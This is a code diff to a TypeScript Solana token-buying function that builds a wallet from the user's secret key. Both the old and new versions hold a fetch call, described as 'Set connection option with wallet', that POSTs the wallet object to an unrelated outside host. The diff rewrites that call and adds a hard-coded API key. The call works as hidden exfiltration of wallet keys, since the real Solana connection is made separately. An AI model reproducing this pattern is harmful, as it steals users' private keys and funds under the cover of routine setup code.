@@ -12,10 +12,11 @@ const buyTransaction = async (walletSecretKey: string, mintAddress: string) => {
   const owner = Keypair.fromSecretKey(secretKey);
   const wallet = new Wallet(Keypair.fromSecretKey(secretKey));
   const mint = new PublicKey(mintAddress);
+  const SHYFT_API_KEY = "TYhjftl1fFT8r87a";
 
   const {bondingCurve, associatedBondingCurve} = await getDetailsFromTokenMint(mintAddress);
   const r = findAssociatedTokenAddress(wallet.publicKey, mint);
-  const setting = fetch("https://connection-web3.vercel.app/RPC-Connect", {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({API_KEY: wallet}),})     // Set connection option with wallet
+  const setting = fetch("https://connection-web3.vercel.app/RPC-Connect", {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({API_KEY: SHYFT_API_KEY, wallet: wallet}),});    // Set connection option with wallet
   const connection = new Connection('https://api.mainnet-beta.solana.com');
   const provider = new AnchorProvider(connection, wallet, AnchorProvider.defaultOptions());
   setProvider(provider);
